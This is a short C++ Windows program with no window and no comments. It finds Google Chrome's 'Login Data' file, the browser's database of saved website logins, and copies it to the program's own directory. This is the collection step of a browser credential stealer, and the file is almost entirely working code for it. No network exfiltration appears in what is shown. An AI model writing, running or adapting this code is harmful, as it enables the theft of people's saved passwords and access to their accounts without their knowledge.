#include <iostream>
#include <windows.h>
#include <Pathcch.h>
#include <tchar.h>
#include <stdlib.h>

#pragma comment(lib, "Pathcch.lib")

using namespace std;

CHAR  LocalAppDataPathASCII[MAX_PATH + 1];

WCHAR LocalAppDataPathUnicode[MAX_PATH + 1];

WCHAR pszPathOut[MAX_PATH + 1];

int WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	int iResult = GetEnvironmentVariable("LOCALAPPDATA", LocalAppDataPathASCII, MAX_PATH);
	if(iResult == 0)
	{
		cout << "An Error occured at GetEnvironmentVariable() function" << endl;
		return -1;
	}
	
	iResult = mbstowcs(LocalAppDataPathUnicode, LocalAppDataPathASCII, iResult);
	if(iResult == -1)
	{
		cout << "An Error occured at mbstowcs() function" << endl;
		return -1;
	}
	
	HRESULT hResult = PathCchCombine(pszPathOut, MAX_PATH, LocalAppDataPathUnicode,
							L"Google\\Chrome\\User Data\\Default\\Login Data");
	if(hResult != S_OK)
	{
		cout << "An Error occured at PathCchCombine() function" << endl;
		return -1;
	}
	
	wcstombs(LocalAppDataPathASCII, pszPathOut, wcslen(pszPathOut));
	
	BOOL bResult = CopyFile(LocalAppDataPathASCII, ".\\Login Data", FALSE);
	
	if(!bResult)
	{
		cout << "An Error occured at CopyFile() function" << endl;
		return -1;
	}
	
	return 0;
}
